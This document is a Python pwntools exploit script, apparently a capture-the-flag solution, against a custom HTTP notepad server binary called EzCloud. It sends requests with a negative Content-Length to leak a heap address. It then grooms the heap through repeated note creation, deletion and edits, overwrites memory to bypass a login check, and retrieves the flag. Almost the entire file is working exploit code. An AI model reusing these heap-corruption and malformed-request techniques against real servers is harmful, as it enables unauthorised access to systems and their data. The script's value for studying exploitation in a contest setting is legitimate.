# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
from urllib import quote
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './EzCloud'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

def login(login_id, body):
    payload =  "POST /login HTTP/1.1\r\n"
    payload += "Content-Length: -1\r\n"
    payload += "Login-ID: {}\r\n".format(login_id)
    payload += "\r\n"
    payload += body
    se(payload)
    ru("</body></html>\r\n")

def f(login_id):
    payload =  "GET /flag HTTP/1.1\r\n"
    payload += "Content-Length: -1\r\n"
    payload += "Login-ID: {}\r\n".format(login_id)
    payload += "\r\n"
    se(payload)
    ru("</body></html>\r\n")

def new_node(login_id, cont):
    payload =  "POST /notepad HTTP/1.1\r\n"
    payload += "Content-Length: {}\r\n".format(len(cont))
    payload += "Content-Type: application/x-www-form-urlencoded\r\n"
    payload += "Login-ID: {}\r\n".format(login_id)
    payload += "Note-Operation: new%20note\r\n"
    payload += "\r\n"
    payload += cont
    se(payload)
    ru("</body></html>\r\n")

def delete_node(login_id, idx):
    payload =  "POST /notepad HTTP/1.1\r\n"
    payload += "Login-ID: {}\r\n".format(login_id)
    payload += "Note-ID: {}%00\r\n".format(idx)
    payload += "Note-Operation: delete%20note\r\n"
    payload += "Content-Length: 0\r\n"
    payload += "\r\n"
    se(payload)
    ru("</body></html>\r\n")
    # sleep(1)

def edit_note(login_id, cont, note_id):
    payload =  "POST /notepad HTTP/1.1\r\n"
    payload += "Content-Length: {}\r\n".format(len(cont))
    payload += "Content-Type: application/x-www-form-urlencoded\r\n"
    payload += "Login-ID: {}\r\n".format(login_id)
    payload += "Note-Operation: edit%20note\r\n"
    payload += "Note-ID: {}%00\r\n".format(note_id)
    payload += "\r\n"
    payload += cont
    se(payload)
    ru("</body></html>\r\n")

def attack():
    # dbg()
    payload = "POST /connectvm HTTP/1.1\r\n"
    payload += "Content-Length: -1\r\n"
    payload += "\r\n"
    se(payload)
    ru("</body></html>\r\n")

    payload =  "GET x HTTP/1.1\r\n"
    payload += "Login-ID: 12345\r\n"
    payload += "\r\n"
    se(payload)
    ru("<p>The requested URL x")
    heap_base = u64( '\x00'+p.recvuntil(' was not found' , drop= True)+'\x00\x00' )&0xfffffffff000
    lg('heap_base' , heap_base)

    login('0' * 8, "")

    for i in range(16):
        payload = quote((p8(i) * 0x17))
        new_node('0' * 8, payload)

    for i in range(16):
        delete_node('0' * 8, i)
    for i in range(16):
        payload = quote((p8(i) * 0x17))
        new_node('0' * 8, "")

    edit_note('0'*8, quote(p64(heap_base+0x1b70)), 0)
    edit_note('0'*8, 'c'*8, 2)
    edit_note('0'*8, quote(p64(1)), 5)

    f('0'*8)

    # dbg()

    # sl('echo shell')
    # rl('shell')
    p.interactive()

attack()

'''
@File    :   EzCloud.py
@Time    :   2021/10/13 14:37:59
@Author  :   Niyah 
'''